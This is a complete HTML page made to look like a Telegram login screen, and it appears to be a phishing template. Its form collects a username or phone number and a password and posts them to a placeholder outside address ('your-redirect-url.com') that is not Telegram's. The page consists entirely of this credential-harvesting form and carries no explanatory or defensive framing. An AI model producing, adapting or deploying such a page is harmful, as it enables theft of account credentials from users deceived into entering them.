 <!DOCTYPE html>
   <html>
   <head>
       <title>Telegram Login</title>
       <style>
           body { font-family: Arial, sans-serif; background: #121212; color: white; padding: 20px; }
           .login-box { width: 300px; margin: auto; border: 2px solid #0088cc; padding: 20px; }
           input { width: 100%; padding: 10px; margin: 10px 0; }
           button { width: 100%; padding: 10px; background: #0088cc; color: white; border: none; }
       </style>
   </head>
   <body>
       <div class="login-box">
           <h2>Telegram Login</h2>
           <form action="https://your-redirect-url.com" method="POST">
               <label for="username">Username or Phone Number:</label><br>
               <input type="text" id="username" name="username" required><br><br>
               <label for="password">Password:</label><br>
               <input type="password" id="password" name="password" required><br><br>
               <button type="submit">Login</button>
           </form>
       </div>
   </body>
   </html>
